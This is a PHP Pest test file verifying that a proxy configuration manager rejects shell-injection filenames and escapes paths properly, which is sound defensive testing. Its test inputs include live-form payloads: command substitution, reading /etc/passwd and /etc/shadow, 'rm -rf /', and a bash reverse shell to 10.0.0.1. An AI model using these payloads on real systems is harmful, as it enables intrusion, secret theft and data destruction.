<?php

use App\Livewire\Server\Proxy\DynamicConfigurations;

/**
 * Proxy Configuration Security Tests
 *
 * Tests to ensure dynamic proxy configuration management is protected against
 * command injection attacks via malicious filenames.
 *
 * Related Issues: #5 in security_issues.md
 * Related Files:
 *  - app/Livewire/Server/Proxy/NewDynamicConfiguration.php
 *  - app/Livewire/Server/Proxy/DynamicConfigurationNavbar.php
 */
test('proxy configuration rejects command injection in filename with command substitution', function () {
    expect(fn () => validateShellSafePath('test$(whoami)', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with semicolon', function () {
    expect(fn () => validateShellSafePath('config; id > /tmp/pwned', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with pipe', function () {
    expect(fn () => validateShellSafePath('config | cat /etc/passwd', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with backticks', function () {
    expect(fn () => validateShellSafePath('config`whoami`.yaml', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with ampersand', function () {
    expect(fn () => validateShellSafePath('config && rm -rf /', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects command injection with redirect operators', function () {
    expect(fn () => validateShellSafePath('test > /tmp/evil', 'proxy configuration filename'))
        ->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('test < /etc/shadow', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration rejects reverse shell payload', function () {
    expect(fn () => validateShellSafePath('test$(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1)', 'proxy configuration filename'))
        ->toThrow(Exception::class);
});

test('proxy configuration escapes filenames properly', function () {
    $filename = "config'test.yaml";
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'config'\\''test.yaml'");
});

test('proxy configuration escapes filenames with spaces', function () {
    $filename = 'my config.yaml';
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'my config.yaml'");
});

test('proxy configuration accepts legitimate Traefik filenames', function () {
    expect(fn () => validateShellSafePath('my-service.yaml', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('app.yml', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('router_config.yaml', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);
});

test('proxy configuration accepts legitimate Caddy filenames', function () {
    expect(fn () => validateShellSafePath('my-service.caddy', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('app_config.caddy', 'proxy configuration filename'))
        ->not->toThrow(Exception::class);
});

test('dynamic configuration listing filters unsafe remote filenames', function () {
    $files = DynamicConfigurations::safeDynamicConfigurationFiles(implode("\n", [
        'router_config.yml',
        'good-service.yaml',
        'bad; id.yaml',
        'bad$(id).yaml',
        '../traversal.yaml',
        '.hidden.yaml',
        'space name.yaml',
        'pipe|name.yaml',
    ]));

    expect($files->all())->toBe([
        'good-service.yaml',
        'router_config.yml',
    ]);
});

test('dynamic configuration loader escapes full file path before cat command', function () {
    $fullPath = '/data/coolify/proxy/dynamic/good-service.yaml';

    expect('cat '.escapeshellarg($fullPath))
        ->toBe("cat '/data/coolify/proxy/dynamic/good-service.yaml'");
});
